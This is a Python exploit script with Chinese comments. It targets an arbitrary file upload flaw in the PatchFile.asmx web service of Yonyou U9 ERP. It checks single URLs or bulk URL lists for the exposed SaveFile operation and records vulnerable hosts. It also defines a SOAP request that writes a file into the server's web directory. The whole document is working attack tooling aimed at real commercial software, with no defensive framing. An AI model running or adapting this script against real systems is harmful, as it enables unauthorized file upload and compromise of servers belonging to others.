import requests
import argparse
import time
import warnings
warnings.filterwarnings("ignore")

# 验证
payload1=r"/CS/Office/AutoUpdates/PatchFile.asmx?op=SaveFile"
# 上传
payload2=r"/CS/Office/AutoUpdates/PatchFile.asmx"
# 上传文件
payload3=r"/CS/Office/AutoUpdates/1.txt"
# 漏洞名称
vul_name="用友U9 PatchFile.asmx 任意文件上传漏洞"

def get_time():
    mtime=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime())
    return mtime

def print_colored(text, color):
    colors = {
        'black': '\033[0;30m',
        'red': '\033[0;31m',
        'green': '\033[0;32m',
        'yellow': '\033[0;33m',
        'blue': '\033[0;34m',
        'purple': '\033[0;35m',
        'cyan': '\033[0;36m',
        'white': '\033[0;37m'
    }
    reset = '\033[0m'
    if color in colors:
        colored_text = colors[color] + text + reset
        print(colored_text,end='')
    else:
        print(text,end='')

def send_get(url):
    try:
        response=requests.get(f"{url}{payload1}",verify=False,timeout=5)  
        if response.status_code==200 and "SaveFile" in response.text:
            print_colored(f'[+] {get_time()} {url} 存在{vul_name} 漏洞路径{url}{payload1}\n ','green')
            res=f"{url}{payload1}"
            return res
        else:
            print_colored(f'[-] {get_time()} {url} 不存在{vul_name}\n ','red')
    except Exception as e:
        print(f"{url} 请求超时")

def send_post(url):
    flag=send_get(url)
    if flag:
        header={
            "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        }
        
        data = """
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
        <SaveFile xmlns="http://tempuri.org/">
        <binData>MTIzNDU2</binData>
        <path>./</path>
        <fileName>1.txt</fileName>
        </SaveFile>
        </soap:Body>
        </soap:Envelope>
        """
        try:
            response=requests.post(f"{url}{payload2}",data=data,timeout=2)
            print(response.text)
            if response.status_code ==200 and "<SaveFileResult>true</SaveFileResult>" in response.text:
                print_colored(f"[+] {get_time()} 文件上传成功\n","green")
                return True
            else:
                print_colored(f"[-] {get_time()} 文件上传成功失败\n","red")
                return False
        except Exception as e:
            print_colored(f"[-] {get_time()} 文件上传成功失败{e}\n","red")
            return False
    else:
        pass
        
# def get_file(url):
#     flag=send_get(url)
#     u=f"{url}{payload3}"
#     if flag:
#         response=requests.get(u,timeout=1)
#         if response.status_code==200 and "123456" in response.text:
#             return u
#     else:
#         pass


        

def main():
    parser = argparse.ArgumentParser(description='命令行参数示例')
    # 添加参数选项
    parser.add_argument('-u', '--url', type=str, help='单个url')
    parser.add_argument('-f', '--file', type=str, help='url文本文件路径')
    parser.add_argument('-o', '--output', type=str, help='保存结果')
    # 解析命令行参数
    args = parser.parse_args()
    
    if args.url:
        res=send_get(args.url)
    if args.file:
        with open(args.file,'r') as f1:
            fs=f1.readlines()
            for u in fs:
                url=u.strip()
                res=send_get(url)
                if args.output:
                    with open(args.output+f"/{vul_name}.txt",'a+',encoding='utf-8') as f2:
                        if res==None:
                            pass
                        else:
                            f2.write(f"{res}\n")
    
main()
    
    